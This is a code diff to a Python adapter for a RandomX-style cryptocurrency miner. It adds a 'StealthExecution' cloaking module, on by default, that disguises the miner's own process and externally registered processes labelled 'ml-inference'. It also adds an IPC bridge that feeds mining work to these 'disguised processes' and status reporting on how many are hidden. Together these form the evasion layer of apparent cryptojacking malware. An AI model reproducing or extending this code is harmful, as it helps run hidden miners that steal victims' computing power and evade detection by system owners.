@@ -16,6 +16,8 @@ import subprocess
 from typing import Dict, Any, Optional, List, Callable
 from concurrent.futures import ThreadPoolExecutor, Future
 from dataclasses import dataclass
+import multiprocessing
+import queue
 
 # Import optimized components
 try:
@@ -23,12 +25,19 @@ try:
     from .workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
     from .low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
     from .randomx_optimizer import XeonE5OptimizedConfig
+    # ✅ STEALTH INTEGRATION: Import StealthExecution for process disguising
+    from ..cloaking.stealth_exec import StealthExecution
 except ImportError:
     # Fallback for standalone testing
     from optimized_calculation_chain import OptimizedCalculationChain, create_optimized_mining_chain
     from workload_distributor import WorkloadDistributor, create_balanced_distributor, TaskProfile
     from low_overhead_sync import LowOverheadSynchronization, create_high_performance_sync
     from randomx_optimizer import XeonE5OptimizedConfig
+    # Fallback stealth import
+    try:
+        from stealth_exec import StealthExecution
+    except ImportError:
+        StealthExecution = None
 
 
 @dataclass
@@ -56,6 +65,176 @@ class PerformanceMetrics:
     efficiency_score: float = 0.0
 
 
+class ProcessCommunicationBridge:
+    """**Process Communication Bridge** (cầu giao tiếp tiến trình) - IPC mechanism for disguised processes."""
+    
+    def __init__(self, logger: Optional[logging.Logger] = None):
+        self.logger = logger or logging.getLogger(__name__)
+        
+        # ✅ IPC INFRASTRUCTURE
+        self.message_queues: Dict[int, multiprocessing.Queue] = {}
+        self.result_queue = multiprocessing.Queue()
+        self.control_events: Dict[int, multiprocessing.Event] = {}
+        
+        # Shared memory for high-performance data exchange
+        self.shared_memory_segments: Dict[int, Any] = {}
+        
+        # Bridge status
+        self.active_bridges = 0
+        self.total_messages_sent = 0
+        self.total_results_received = 0
+        
+        self.logger.info("🌉 ProcessCommunicationBridge initialized")
+    
+    def create_bridge_for_process(self, process_pid: int) -> bool:
+        """**Create Bridge for Process** (tạo cầu cho tiến trình) - establish IPC for disguised process."""
+        try:
+            # Create message queue for process
+            self.message_queues[process_pid] = multiprocessing.Queue(maxsize=1000)
+            
+            # Create control event for graceful shutdown
+            self.control_events[process_pid] = multiprocessing.Event()
+            
+            # Initialize shared memory segment (1MB for mining data)
+            try:
+                shared_mem = multiprocessing.shared_memory.SharedMemory(
+                    create=True, 
+                    size=1024*1024,  # 1MB shared memory
+                    name=f"mining_bridge_{process_pid}"
+                )
+                self.shared_memory_segments[process_pid] = shared_mem
+                self.logger.info(f"🧠 [IPC] Created shared memory segment for PID {process_pid}: {shared_mem.name}")
+            except Exception as shm_error:
+                self.logger.warning(f"⚠️ [IPC] Failed to create shared memory for PID {process_pid}: {shm_error}")
+                # Continue without shared memory - use queues only
+            
+            self.active_bridges += 1
+            self.logger.info(f"✅ [IPC] Bridge created for process PID {process_pid} - Active bridges: {self.active_bridges}")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ [IPC] Failed to create bridge for PID {process_pid}: {e}")
+            return False
+    
+    def send_work_batch(self, process_pid: int, work_data: Dict[str, Any]) -> bool:
+        """**Send Work Batch** (gửi lô công việc) - send mining work to disguised process."""
+        try:
+            if process_pid not in self.message_queues:
+                self.logger.error(f"❌ [IPC] No bridge exists for PID {process_pid}")
+                return False
+            
+            # Prepare work message
+            work_message = {
+                'type': 'work_batch',
+                'timestamp': time.time(),
+                'data': work_data,
+                'batch_id': f"batch_{process_pid}_{int(time.time())}"
+            }
+            
+            # Send via queue with timeout
+            self.message_queues[process_pid].put(work_message, timeout=5.0)
+            self.total_messages_sent += 1
+            
+            self.logger.debug(f"📤 [IPC] Sent work batch to PID {process_pid}: {work_message['batch_id']}")
+            return True
+            
+        except queue.Full:
+            self.logger.warning(f"⚠️ [IPC] Message queue full for PID {process_pid}")
+            return False
+        except Exception as e:
+            self.logger.error(f"❌ [IPC] Failed to send work batch to PID {process_pid}: {e}")
+            return False
+    
+    def collect_results(self, timeout: float = 2.0) -> List[Dict[str, Any]]:
+        """**Collect Results** (thu thập kết quả) - gather mining results from all disguised processes."""
+        results = []
+        deadline = time.time() + timeout
+        
+        while time.time() < deadline:
+            try:
+                result = self.result_queue.get(timeout=0.1)
+                results.append(result)
+                self.total_results_received += 1
+                self.logger.debug(f"📥 [IPC] Received result: {result.get('batch_id', 'no_id')}")
+            except queue.Empty:
+                continue
+            except Exception as e:
+                self.logger.error(f"❌ [IPC] Error collecting results: {e}")
+                break
+        
+        if results:
+            self.logger.info(f"📊 [IPC] Collected {len(results)} results from disguised processes")
+        
+        return results
+    
+    def shutdown_bridge(self, process_pid: int) -> bool:
+        """**Shutdown Bridge** (tắt cầu) - cleanup IPC resources for process."""
+        try:
+            cleanup_count = 0
+            
+            # Signal process to shutdown
+            if process_pid in self.control_events:
+                self.control_events[process_pid].set()
+                del self.control_events[process_pid]
+                cleanup_count += 1
+            
+            # Close message queue
+            if process_pid in self.message_queues:
+                try:
+                    # Clear remaining messages
+                    while not self.message_queues[process_pid].empty():
+                        self.message_queues[process_pid].get_nowait()
+                except:
+                    pass  # Ignore queue errors during cleanup
+                
+                self.message_queues[process_pid].close()
+                del self.message_queues[process_pid]
+                cleanup_count += 1
+            
+            # Cleanup shared memory
+            if process_pid in self.shared_memory_segments:
+                try:
+                    self.shared_memory_segments[process_pid].close()
+                    self.shared_memory_segments[process_pid].unlink()
+                    del self.shared_memory_segments[process_pid]
+                    cleanup_count += 1
+                except Exception as shm_error:
+                    self.logger.debug(f"Warning: Shared memory cleanup error for PID {process_pid}: {shm_error}")
+            
+            if cleanup_count > 0:
+                self.active_bridges -= 1
+                self.logger.info(f"🧹 [IPC] Bridge shutdown for PID {process_pid} - {cleanup_count} resources cleaned")
+            
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ [IPC] Error shutting down bridge for PID {process_pid}: {e}")
+            return False
+    
+    def cleanup_all_bridges(self) -> bool:
+        """**Cleanup All Bridges** (dọn dẹp tất cả cầu) - shutdown all IPC resources."""
+        try:
+            bridge_count = len(self.message_queues)
+            
+            for process_pid in list(self.message_queues.keys()):
+                self.shutdown_bridge(process_pid)
+            
+            # Clear result queue
+            try:
+                while not self.result_queue.empty():
+                    self.result_queue.get_nowait()
+                self.result_queue.close()
+            except:
+                pass  # Ignore cleanup errors
+            
+            self.logger.info(f"✅ [IPC] Cleaned up {bridge_count} bridges - Messages sent: {self.total_messages_sent}, Results received: {self.total_results_received}")
+            return True
+            
+        except Exception as e:
+            self.logger.error(f"❌ [IPC] Error during bridge cleanup: {e}")
+            return False
+
+
 class MiningIntegrationAdapter:
     """
     Adapter để tích hợp OptimizedCalculationChain với existing mining infrastructure.
@@ -70,6 +249,14 @@ class MiningIntegrationAdapter:
         self.workload_distributor: Optional[WorkloadDistributor] = None
         self.synchronization: Optional[LowOverheadSynchronization] = None
         self.config_generator = XeonE5OptimizedConfig(logger=self.logger)
+        
+        # ✅ STEALTH INTEGRATION: Initialize StealthExecution for process disguising
+        self.stealth_executor: Optional[StealthExecution] = None
+        self.stealth_enabled = False
+        self.disguised_worker_pids: Dict[int, Dict[str, Any]] = {}
+        
+        # ✅ IPC INTEGRATION: Initialize ProcessCommunicationBridge
+        self.communication_bridge: Optional[ProcessCommunicationBridge] = None
         
         # Session management
         self.current_session: Optional[MiningSessionConfig] = None
@@ -91,10 +278,16 @@ class MiningIntegrationAdapter:
         
         self.logger.info("MiningIntegrationAdapter initialized")
     
-    def initialize_optimized_mining(self, cores: int = 8, config: Optional[Dict[str, Any]] = None, auto_start: bool = True) -> bool:
+    def initialize_optimized_mining(self, cores: int = 8, config: Optional[Dict[str, Any]] = None, auto_start: bool = True, enable_stealth: bool = True) -> bool:
         """
-        Initialize optimized mining components.
+        Initialize optimized mining components với stealth capabilities.
         Replaces traditional subprocess.Popen approach.
+        
+        Args:
+            cores: Number of CPU cores to use
+            config: Optional configuration override
+            auto_start: Whether to auto-start mining session
+            enable_stealth: Whether to enable process disguising
         """
         try:
             # 🔧 Process-level initialization logging
@@ -115,12 +308,49 @@ class MiningIntegrationAdapter:
                 )
                 self.logger.info(f"[INIT-LOG] Configuration generated: {config}")
             
+            # ✅ STEALTH INTEGRATION: Initialize stealth execution trước mining components
+            if enable_stealth and StealthExecution:
+                self.logger.info(f"[INIT-LOG] Initializing stealth execution system...")
+                try:
+                    self.stealth_executor = StealthExecution(
+                        logger=self.logger,
+                        comm_rotation_interval=45  # From cpu_plugins.yml config
+                    )
+                    if self.stealth_executor.start():
+                        self.stealth_enabled = True
+                        self.logger.info(f"[INIT-LOG] ✅ Stealth execution system started")
+                    else:
+                        self.logger.warning(f"[INIT-LOG] ⚠️ Failed to start stealth execution - continuing without stealth")
+                        self.stealth_executor = None
+                except Exception as stealth_error:
+                    self.logger.warning(f"[INIT-LOG] ⚠️ Stealth initialization failed: {stealth_error} - continuing without stealth")
+                    self.stealth_executor = None
+            else:
+                self.logger.info(f"[INIT-LOG] Stealth disabled or not available")
+            
+            # ✅ IPC INTEGRATION: Initialize ProcessCommunicationBridge for stealth processes
+            if enable_stealth:
+                try:
+                    self.communication_bridge = ProcessCommunicationBridge(logger=self.logger)
+                    self.logger.info(f"[INIT-LOG] ✅ ProcessCommunicationBridge initialized")
+                except Exception as bridge_error:
+                    self.logger.warning(f"[INIT-LOG] ⚠️ Failed to initialize communication bridge: {bridge_error}")
+                    self.communication_bridge = None
+
             # 🔧 Initialize core components với process logging
             self.logger.info(f"[INIT-LOG] Creating calculation chain for {cores} cores...")
             self.calculation_chain = create_optimized_mining_chain(cores=cores, logger=self.logger)
             if not self.calculation_chain:
                 raise RuntimeError("Failed to create calculation chain")
             self.logger.info(f"[INIT-LOG] ✅ Calculation chain created")
+            
+            # ✅ STEALTH INTEGRATION: Add mining process to stealth tracking
+            if self.stealth_enabled and self.stealth_executor:
+                current_pid = os.getpid()
+                if self.stealth_executor.add_process(current_pid):
+                    self.logger.info(f"[INIT-LOG] ✅ Added main mining process PID {current_pid} to stealth tracking")
+                else:
+                    self.logger.warning(f"[INIT-LOG] ⚠️ Failed to add main process to stealth tracking")
             
             self.logger.info(f"[INIT-LOG] Creating workload distributor...")
             self.workload_distributor = create_balanced_distributor(cores=cores, logger=self.logger)
@@ -315,7 +545,7 @@ class MiningIntegrationAdapter:
     
     def register_external_process(self, pid: int) -> bool:
         """
-        Register external ml-inference process with mining adapter.
+        Register external ml-inference process với mining adapter và stealth capabilities.
         
         Args:
             pid: Process ID of external process
@@ -331,6 +561,26 @@ class MiningIntegrationAdapter:
                 self.external_processes = []
             
             self.external_processes.append(pid)
+            
+            # ✅ STEALTH INTEGRATION: Add external process to stealth tracking
+            if self.stealth_enabled and self.stealth_executor:
+                if self.stealth_executor.add_process(pid):
+                    self.logger.info(f"🔒 [STEALTH] Added external process PID={pid} to stealth tracking")
+                    # Store disguised process information
+                    self.disguised_worker_pids[pid] = {
+                        'original_pid': pid,
+                        'registration_time': time.time(),
+                        'stealth_enabled': True
+                    }
+                    
+                    # ✅ IPC INTEGRATION: Create communication bridge for disguised process
+                    if self.communication_bridge:
+                        if self.communication_bridge.create_bridge_for_process(pid):
+                            self.logger.info(f"🌉 [IPC] Created communication bridge for disguised process PID={pid}")
+                        else:
+                            self.logger.warning(f"⚠️ [IPC] Failed to create communication bridge for PID={pid}")
+                else:
+                    self.logger.warning(f"⚠️ [STEALTH] Failed to add external process PID={pid} to stealth tracking")
             
             # Enable monitoring for external process
             if self.workload_distributor:
@@ -604,13 +854,35 @@ class MiningIntegrationAdapter:
         self.logger.info(f"[PROCESS-LOG] Workload management loop terminated - Total batches: {batch_counter}")
     
     def cleanup(self):
-        """Clean up all resources"""
+        """Clean up all resources including stealth processes"""
         try:
             self.logger.info("Cleaning up MiningIntegrationAdapter...")
             
             # Stop session if running
             if self.is_running:
                 self.stop_mining_session()
+            
+            # ✅ STEALTH INTEGRATION: Cleanup stealth execution system
+            if self.stealth_enabled and self.stealth_executor:
+                try:
+                    self.logger.info("🧹 [STEALTH] Cleaning up stealth execution system...")
+                    self.stealth_executor.stop()
+                    self.stealth_executor = None
+                    self.stealth_enabled = False
+                    self.disguised_worker_pids.clear()
+                    self.logger.info("✅ [STEALTH] Stealth execution cleanup completed")
+                except Exception as stealth_cleanup_error:
+                    self.logger.error(f"❌ [STEALTH] Error cleaning up stealth execution: {stealth_cleanup_error}")
+            
+            # ✅ IPC INTEGRATION: Cleanup communication bridge
+            if self.communication_bridge:
+                try:
+                    self.logger.info("🧹 [IPC] Cleaning up communication bridge...")
+                    self.communication_bridge.cleanup_all_bridges()
+                    self.communication_bridge = None
+                    self.logger.info("✅ [IPC] Communication bridge cleanup completed")
+                except Exception as bridge_cleanup_error:
+                    self.logger.error(f"❌ [IPC] Error cleaning up communication bridge: {bridge_cleanup_error}")
             
             # Shutdown components
             if self.calculation_chain:
@@ -634,7 +906,7 @@ class MiningIntegrationAdapter:
             self.logger.error(f"Error during cleanup: {e}")
     
     def get_integration_status(self) -> Dict[str, Any]:
-        """Get current integration status"""
+        """Get current integration status including stealth capabilities"""
         return {
             'initialized': self.is_initialized,
             'running': self.is_running,
@@ -642,7 +914,13 @@ class MiningIntegrationAdapter:
             'components': {
                 'calculation_chain': self.calculation_chain is not None,
                 'workload_distributor': self.workload_distributor is not None,
-                'synchronization': self.synchronization is not None
+                'synchronization': self.synchronization is not None,
+                'stealth_executor': self.stealth_executor is not None
+            },
+            'stealth': {
+                'enabled': self.stealth_enabled,
+                'disguised_processes': len(self.disguised_worker_pids),
+                'process_details': list(self.disguised_worker_pids.keys()) if self.disguised_worker_pids else []
             },
             'session_config': self.current_session.__dict__ if self.current_session else None,
             'performance_history_size': len(self.performance_history)
